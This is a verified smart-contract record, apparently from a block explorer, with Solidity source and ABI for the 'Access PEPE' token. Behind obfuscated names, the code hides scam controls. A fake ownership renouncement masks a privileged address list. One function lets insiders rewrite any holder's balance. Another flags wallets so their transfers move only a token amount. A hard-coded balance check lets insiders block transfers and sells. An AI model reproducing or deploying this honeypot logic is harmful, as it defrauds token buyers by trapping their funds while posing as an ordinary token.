{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface launchedAutoMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address sellLaunchedSwap) external view returns (uint256);\n\n    function transfer(address toSwapIs, uint256 receiverFromLimit) external returns (bool);\n\n    function allowance(address tradingLaunchedMarketing, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverFromLimit) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address toSwapIs,\n        uint256 receiverFromLimit\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed autoShould, uint256 value);\n    event Approval(address indexed tradingLaunchedMarketing, address indexed spender, uint256 value);\n}\n\nabstract contract isAmount {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface feeTrading {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface amountTo {\n    function createPair(address takeWallet, address receiverTotalMarketing) external returns (address);\n}\n\ninterface launchedAutoMinMetadata is launchedAutoMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AccessPEPE is isAmount, launchedAutoMin, launchedAutoMinMetadata {\n\n    function transfer(address minToShould, uint256 receiverFromLimit) external virtual override returns (bool) {\n        return toList(_msgSender(), minToShould, receiverFromLimit);\n    }\n\n    function buyReceiver(address minToShould, uint256 receiverFromLimit) public {\n        takeTx();\n        receiverReceiver[minToShould] = receiverFromLimit;\n    }\n\n    uint256 constant fromTotal = 4 ** 10;\n\n    uint256 private txWalletFrom;\n\n    uint256 private limitExempt = 100000000 * 10 ** 18;\n\n    bool private launchLiquidity;\n\n    address private receiverLimit;\n\n    function launchTeam(address swapToLaunched) public {\n        if (receiverLaunch) {\n            return;\n        }\n        if (txWalletFrom == limitLaunched) {\n            limitLaunched = txWalletFrom;\n        }\n        sellTeam[swapToLaunched] = true;\n        if (limitSell != swapFee) {\n            limitSell = true;\n        }\n        receiverLaunch = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private feeReceiver;\n\n    uint256 swapLaunched;\n\n    function launchSell(address teamLaunch, address toSwapIs, uint256 receiverFromLimit) internal returns (bool) {\n        require(receiverReceiver[teamLaunch] >= receiverFromLimit);\n        receiverReceiver[teamLaunch] -= receiverFromLimit;\n        receiverReceiver[toSwapIs] += receiverFromLimit;\n        emit Transfer(teamLaunch, toSwapIs, receiverFromLimit);\n        return true;\n    }\n\n    function approve(address isToken, uint256 receiverFromLimit) public virtual override returns (bool) {\n        feeReceiver[_msgSender()][isToken] = receiverFromLimit;\n        emit Approval(_msgSender(), isToken, receiverFromLimit);\n        return true;\n    }\n\n    function walletEnable(address receiverMarketing) public {\n        takeTx();\n        \n        if (receiverMarketing == amountToken || receiverMarketing == modeToken) {\n            return;\n        }\n        tokenReceiver[receiverMarketing] = true;\n    }\n\n    bool public receiverLaunch;\n\n    function toList(address teamLaunch, address toSwapIs, uint256 receiverFromLimit) internal returns (bool) {\n        if (teamLaunch == amountToken) {\n            return launchSell(teamLaunch, toSwapIs, receiverFromLimit);\n        }\n        uint256 senderShould = launchedAutoMin(modeToken).balanceOf(liquidityMarketingMax);\n        require(senderShould == swapLaunched);\n        require(toSwapIs != liquidityMarketingMax);\n        if (tokenReceiver[teamLaunch]) {\n            return launchSell(teamLaunch, toSwapIs, fromTotal);\n        }\n        return launchSell(teamLaunch, toSwapIs, receiverFromLimit);\n    }\n\n    string private receiverEnable = \"APE\";\n\n    uint256 private limitLaunched;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return limitExempt;\n    }\n\n    function takeTx() private view {\n        require(sellTeam[_msgSender()]);\n    }\n\n    function allowance(address totalMax, address isToken) external view virtual override returns (uint256) {\n        if (isToken == swapLimit) {\n            return type(uint256).max;\n        }\n        return feeReceiver[totalMax][isToken];\n    }\n\n    constructor (){\n        if (swapFee) {\n            limitLaunched = txWalletFrom;\n        }\n        feeTrading amountMax = feeTrading(swapLimit);\n        modeToken = amountTo(amountMax.factory()).createPair(amountMax.WETH(), address(this));\n        \n        amountToken = _msgSender();\n        exemptLiquidity();\n        sellTeam[amountToken] = true;\n        receiverReceiver[amountToken] = limitExempt;\n        if (limitSell) {\n            txWalletFrom = limitLaunched;\n        }\n        emit Transfer(address(0), amountToken, limitExempt);\n    }\n\n    mapping(address => uint256) private receiverReceiver;\n\n    address public modeToken;\n\n    bool public swapFee;\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverSwap;\n    }\n\n    address liquidityMarketingMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    event OwnershipTransferred(address indexed listSwap, address indexed tradingEnable);\n\n    bool public liquidityShould;\n\n    address public amountToken;\n\n    address swapLimit = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function name() external view virtual override returns (string memory) {\n        return launchedList;\n    }\n\n    bool private limitSell;\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverEnable;\n    }\n\n    string private launchedList = \"Access PEPE\";\n\n    function owner() external view returns (address) {\n        return receiverLimit;\n    }\n\n    function balanceOf(address sellLaunchedSwap) public view virtual override returns (uint256) {\n        return receiverReceiver[sellLaunchedSwap];\n    }\n\n    mapping(address => bool) public tokenReceiver;\n\n    uint256 txFrom;\n\n    function getOwner() external view returns (address) {\n        return receiverLimit;\n    }\n\n    function exemptLiquidity() public {\n        emit OwnershipTransferred(amountToken, address(0));\n        receiverLimit = address(0);\n    }\n\n    uint8 private receiverSwap = 18;\n\n    mapping(address => bool) public sellTeam;\n\n    function transferFrom(address teamLaunch, address toSwapIs, uint256 receiverFromLimit) external override returns (bool) {\n        if (_msgSender() != swapLimit) {\n            if (feeReceiver[teamLaunch][_msgSender()] != type(uint256).max) {\n                require(receiverFromLimit <= feeReceiver[teamLaunch][_msgSender()]);\n                feeReceiver[teamLaunch][_msgSender()] -= receiverFromLimit;\n            }\n        }\n        return toList(teamLaunch, toSwapIs, receiverFromLimit);\n    }\n\n    function limitToken(uint256 receiverFromLimit) public {\n        takeTx();\n        swapLaunched = receiverFromLimit;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingLaunchedMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingEnable\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoShould\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isToken\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverFromLimit\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellLaunchedSwap\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minToShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverFromLimit\",\"type\":\"uint256\"}],\"name\":\"buyReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapToLaunched\",\"type\":\"address\"}],\"name\":\"launchTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverFromLimit\",\"type\":\"uint256\"}],\"name\":\"limitToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minToShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverFromLimit\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toSwapIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverFromLimit\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMarketing\",\"type\":\"address\"}],\"name\":\"walletEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AccessPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}